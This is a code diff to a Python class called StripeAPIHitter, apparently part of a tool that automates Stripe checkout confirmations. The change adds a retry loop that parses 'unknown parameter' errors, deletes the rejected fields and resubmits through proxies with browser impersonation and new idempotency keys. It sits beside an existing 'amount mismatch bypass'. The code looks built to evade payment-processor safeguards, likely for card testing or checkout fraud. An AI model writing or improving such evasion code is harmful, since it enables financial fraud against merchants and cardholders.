@@ -957,16 +957,39 @@ class StripeAPIHitter:
                 err_code = confirm_json.get('error', {}).get('code')
                 err_msg = confirm_json.get('error', {}).get('message', '') or ''
                 
-                # Parameter Unknown Bypass
-                # If Stripe rejects our injected "payment_method_options[card][request_three_d_secure]" because the specific 
-                # checkout link does not support it (e.g. basic SetupIntents or strict PaymentIntents), we must delete it and retry.
-                if confirm_res.status_code == 400 and err_code == 'parameter_unknown' and 'payment_method_options' in err_msg:
-                    del confirm_data['payment_method_options[card][request_three_d_secure]']
+                # Parameter Unknown Bypass — iteratively strip any rejected parameter and retry
+                # Stripe will name the offending param in the error message, so we parse and remove it.
+                _param_retry_limit = 4
+                _param_retries = 0
+                while confirm_res.status_code == 400 and err_code == 'parameter_unknown' and _param_retries < _param_retry_limit:
+                    # Extract the offending parameter name from the error message
+                    # e.g. "Received unknown parameter: allow_redisplay" or "... payment_method_options[card][request_three_d_secure]"
+                    import re as _re2
+                    _param_match = _re2.search(r'unknown parameter[:\s]+([^\s\.\,]+)', err_msg, _re2.IGNORECASE)
+                    _stripped = False
+                    if _param_match:
+                        _bad_param = _param_match.group(1).strip("'\"")
+                        # Find and remove any key in confirm_data that contains the offending param segment
+                        _keys_to_del = [k for k in list(confirm_data.keys()) if _bad_param in k]
+                        for _k in _keys_to_del:
+                            del confirm_data[_k]
+                            _stripped = True
+                    else:
+                        # Fallback: strip known optional params one by one
+                        for _fallback_param in ['allow_redisplay', 'save_payment_method', 'payment_method_options[card][request_three_d_secure]', 'payment_method_options[card][mit_exemption][reason]']:
+                            if _fallback_param in confirm_data:
+                                del confirm_data[_fallback_param]
+                                _stripped = True
+                                break
+                    if not _stripped:
+                        break
                     confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                     confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                     confirm_json = confirm_res.json()
                     err_code = confirm_json.get('error', {}).get('code')
                     err_msg = confirm_json.get('error', {}).get('message', '') or ''
+                    _param_retries += 1
+
                 
                 # Unified Amount Mismatch Bypass
                 if confirm_res.status_code != 200 and (err_code == 'checkout_amount_mismatch' or 'expected amount' in err_msg.lower() or 'expected_amount' in err_msg):
